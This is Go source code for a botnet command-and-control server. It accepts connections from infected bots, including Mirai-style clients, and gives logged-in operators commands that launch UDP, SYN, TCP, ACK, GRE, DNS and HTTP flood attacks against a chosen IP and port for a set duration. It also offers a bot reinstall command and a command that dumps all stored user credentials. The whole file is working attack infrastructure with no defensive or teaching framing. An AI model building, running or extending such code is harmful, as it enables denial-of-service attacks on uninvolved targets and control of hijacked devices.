package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	// File paths
	USERS_FILE = "users.json"

	// Server IPs
	USER_SERVER_IP = "0.0.0.0" // Should use the Devices NIC Public IP
	BOT_SERVER_IP  = "0.0.0.0"

	// Server ports
	BOT_SERVER_PORT  = "7002"
	USER_SERVER_PORT = "420" // Will need to run with sudo if port is lower than 1024

	// Other constants
	MAXFDS = 100
)

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type attack struct {
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var ongoingAttacks = make(map[net.Conn]attack)

const (
	letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

var (
	botCount     int
	botCountLock sync.Mutex
	botConns     []*net.Conn
)

type bot struct {
	arch string
	conn net.Conn
}

var (
	bots       = []bot{}
	clients    = []*client{}
	maxAttacks = 3
)

func main() {
	// Check if users.json file exists; if not, create a root user
	if _, fileError := os.ReadFile("users.json"); fileError != nil {
		// Generate a random password for the root user
		password, err := randomString(12) // Specify desired password length
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		rootUser := User{
			Username: "root",
			Password: password,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}

		// Marshal the root user to JSON
		bytes, err := json.Marshal([]User{rootUser})
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}

		// Write the user data to users.json
		if err := os.WriteFile("users.json", bytes, 0777); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾☼☽] Login with username", rootUser.Username, "and password", rootUser.Password)
	}

	// Start CnC server
	fmt.Println("[☾☼☽] CnC server started on", USER_SERVER_IP+":"+USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error starting user server:", err)
		return
	}
	defer userListener.Close()

	// Start bot server
	fmt.Println("[☾☼☽] Bot server started on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
	botListener, err := net.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
	if err != nil {
		fmt.Println("Error starting bot server:", err)
		return
	}
	defer botListener.Close()

	go updateTitle()

	// User connection handling
	go func() {
		for {
			conn, err := userListener.Accept()
			if err != nil {
				fmt.Println("Error accepting user connection:", err)
				continue
			}
			fmt.Println("[☾☼☽] [User] Connected To Login Port:", conn.RemoteAddr())

			go handleRequest(conn)
		}
	}()

	// Bot connection handling
	for {
		conn, err := botListener.Accept()
		if err != nil {
			fmt.Println("Error accepting bot connection:", err)
			continue
		}
		botConns = append(botConns, &conn)
		fmt.Println("[☾☼☽] Bot connected From", conn.RemoteAddr())
		go handleBotConnection(conn)
	}
}

func updateTitle() {
	for {
		for _, cl := range clients { // Use renamed variable cl
			go func(c *client) { // Use goroutine for each client
				spinChars := []rune{'∴', '∵'}
				spinIndex := 0

				for {
					// Count the number of ongoing attacks
					attackCount := len(ongoingAttacks)

					// Update the title to include the attack count and maximum
					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d |  ☾☼☽  | User: %s [%c]",
						spinChars[spinIndex], getBotCount(), attackCount, maxAttacks, c.user.Username, spinChars[spinIndex])
					setTitle(c.conn, title)
					spinIndex = (spinIndex + 1) % len(spinChars) // Increment by 1 for slower spin
					time.Sleep(1 * time.Second)                  // Adjust sleep duration for slower effect
				}
			}(cl) // Pass the renamed variable cl to goroutine
		}
		time.Sleep(time.Second * 2) // Main update cycle (optional)
	}
}

func authUser(conn net.Conn) (bool, *client) {
	for i := 0; i < 3; i++ {
		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n"))
		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
		username, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
		password, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\033[2J\033[3J"))

		if exists, user := AuthUser(username, password); exists {
			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clients = append(clients, loggedClient)
			return true, loggedClient
		}
	}
	conn.Close()
	return false, nil
}

func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

func sendToBots(command string) {
	for _, botConn := range botConns {
		_, err := (*botConn).Write([]byte(command + "\r\n"))
		fmt.Println("[Command]: " + command + "\r")
		if err != nil {
			fmt.Println("Error sending command to bot:", err)
		}
	}
}

func Ping(conn net.Conn, stopPing <-chan struct{}) {
	ticker := time.NewTicker(5 * time.Second) // Example interval for sending PING
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			_, err := conn.Write([]byte("PING\n"))
			if err != nil {
				fmt.Println("Error sending PING:", err)
				return // Exit goroutine if error occurs
			}
		case <-stopPing:
			fmt.Println("Stopping Ping goroutine")
			return // Exit goroutine if signaled to stop
		}
	}
}

// Handles incoming requests.
func handleRequest(conn net.Conn) {
	conn.Write([]byte(getConsoleTitleAnsi("☾☼☽")))
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return
	}
	if strings.HasPrefix(readString, "PONG") {
		for _, bot := range bots {
			_, err := bot.conn.Write([]byte("PING"))
			if err != nil {
				println(err.Error())
			}
		}
		botArch := strings.Split(readString, ":")[1]
		bots = append(bots, bot{
			arch: botArch,
			conn: conn,
		})
		for {
			botMessage, err := bufio.NewReader(conn).ReadString('\v')
			if err != nil {
				return
			}
			if strings.HasPrefix(botMessage, "!") {
				botMessage = strings.TrimPrefix(botMessage, "!")
				if strings.Contains(botMessage, "/exe") ||
					strings.Contains(botMessage, ": directory not empty") ||
					strings.Contains(botMessage, ".ssh from the device") ||
					strings.Contains(botMessage, "data from the device") ||
					strings.Contains(botMessage, "usrmode from the device") ||
					strings.Contains(botMessage, ": permission denied") ||
					strings.Contains(botMessage, ": operation not permitted") ||
					strings.Contains(botMessage, "device or resource busy") {
					continue
				}
				botArguments := strings.SplitN(botMessage, " ", 1)
				println(strings.TrimPrefix(botMessage, "LOG"))
				if botArguments[0] == "LOG" && len(botArguments) > 1 {
					println(botArguments[1])
				}
			}
		}
	}

	if strings.HasPrefix(readString, "loginforme") {
		if authed, _ := authUser(conn); authed {
			conn.Write([]byte("\033[0m\r                           \033[38;5;15m\033[38;5;118m✅ Authentication Successful\n"))
			for {
				conn.Write([]byte("\n\r\033[38;5;146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))

				// Read input from the connection
				readString, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					if err == io.EOF {
						// Handle EOF (end of input) gracefully
						return
					}
					// Handle other errors
					fmt.Printf("Error reading input: %v\n", err)
					conn.Close()
					return
				}
				// Trim any trailing newline characters
				readString = strings.TrimSuffix(readString, "\r\n")
				readString = strings.TrimSuffix(readString, "\n")

				// Continue with the rest of your code using readString...
				parts := strings.Fields(readString)
				if len(parts) < 1 {
					continue
				}
				command := parts[0]
				switch strings.ToLower(command) {

				case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
					if len(parts) < 4 {
						conn.Write([]byte("Usage: method ip port duration\r\n"))
						continue
					}
					method := parts[0]
					ip := parts[1]
					port := parts[2]
					duration := parts[3]
					dur, err := time.ParseDuration(duration + "s") // Parse duration in seconds
					if err != nil {
						conn.Write([]byte("Invalid duration format.\r\n"))
						continue
					}
					conn.Write([]byte("\r\n"))
					conn.Write([]byte(fmt.Sprintf("host: %s\r\n", ip)))
					conn.Write([]byte(fmt.Sprintf("port: %s\r\n", port)))
					conn.Write([]byte(fmt.Sprintf("length: %s\r\n", duration)))
					conn.Write([]byte(fmt.Sprintf("method: %s\r\n", method)))
					conn.Write([]byte("\r\n"))

					// Store ongoing attack details
					ongoingAttacks[conn] = attack{
						method:   method,
						ip:       ip,
						port:     port,
						duration: dur,
						start:    time.Now(),
					}

					// Start goroutine to delete the attack after its duration
					go func(conn net.Conn, attack attack) {
						time.Sleep(attack.duration)
						delete(ongoingAttacks, conn)
						conn.Write([]byte("Attack has automatically finished and was removed.\n"))
					}(conn, ongoingAttacks[conn])

					sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration)) // send command to all connected devices

				case "ongoing":
					if attack, exists := ongoingAttacks[conn]; exists {
						remaining := time.Until(attack.start.Add(attack.duration))
						if remaining > 0 {
							conn.Write([]byte(fmt.Sprintf("  | Ongoing | Method: %s | IP: %s | Port: %s | Duration: %d Sec's|\n", attack.method, attack.ip, attack.port, int(remaining.Seconds()))))
						} else {
							delete(ongoingAttacks, conn) // Remove the attack from ongoingAttacks
							conn.Write([]byte("Attack has finished.\n"))
						}
					} else {
						conn.Write([]byte("No ongoing attack found.\n"))
					}

				case "bots", "bot":
					conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", getBotCount())))
				case "cls", "clear":
					conn.Write([]byte("\033[2J\033[H"))
				case "logout", "exit":
					conn.Write([]byte("\033[38;5;27mLogging out...\n\r"))
					conn.Close() // Terminate the connection
					return
				case "!reinstall":
					sendToBots("!reinstall")
				case "help":
					conn.Write([]byte("\x1b[38;5;231m -> [ bots, clear, help, db ] \n\r"))
				case "db":
					// Open the JSON file containing credentials
					file, err := os.Open("./users.json")
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error opening credentials file: %v\r\n", err)))
						return
					}
					defer file.Close()

					// Read and parse the file content
					data, err := ioutil.ReadAll(file)
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error reading file: %v\r\n", err)))
						return
					}

					// Parse JSON into a slice of Credential structs
					var credentials []Credential
					err = json.Unmarshal(data, &credentials)
					if err != nil {
						conn.Write([]byte(fmt.Sprintf("Error parsing JSON: %v\r\n", err)))
						return
					}

					// Send each credential entry to the client
					for _, cred := range credentials {
						message := fmt.Sprintf(
							"credentials: Username: %s, Password: %s, Expire: %s, Level: %s\r\n",
							cred.Username, cred.Password, cred.Expire, cred.Level,
						)
						conn.Write([]byte(message))
					}

				case "?":
					conn.Write([]byte("!udpsmart\n\r"))
					conn.Write([]byte("!udpflood\n\r"))
					conn.Write([]byte("!tcpflood\n\r"))
					conn.Write([]byte("!synflood\n\r"))
					conn.Write([]byte("!ackflood\n\r"))
					conn.Write([]byte("!greflood\n\r"))
					conn.Write([]byte("!dns\n\r"))

				default:
					fmt.Printf("Received input: '%s'\n", readString) // Print the raw input received
					conn.Write([]byte("Invalid command.\n\r"))
				}
			}
		}
	}
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return botCount
}

func incrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount++
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount--
}

func handleBotConnection(conn net.Conn) {
	defer conn.Close()

	incrementBotCount()
	defer decrementBotCount()

	stopPing := make(chan struct{})
	defer close(stopPing)

	go Ping(conn, stopPing)

	go MiraiHandler(conn)

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {

	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from bot:", err)
	}
}

func MiraiHandler(conn net.Conn) {
	buf := make([]byte, 1024)
	for {
		ReadBytes, err := conn.Read(buf)
		if err != nil {
			return
		}
		buf = buf[:ReadBytes]
		if buf[0] == 0 && buf[1] == 0 && buf[2] == 0 && buf[3] > 1 {
			buf := make([]byte, 2)
			for {
				err := conn.SetDeadline(time.Now().Add(180 * time.Second))
				if err != nil {
					return
				}
				if n, err := conn.Read(buf); err != nil || n != len(buf) {
					return
				}
			}
		}
		time.Sleep(1 * time.Second)
	}
}
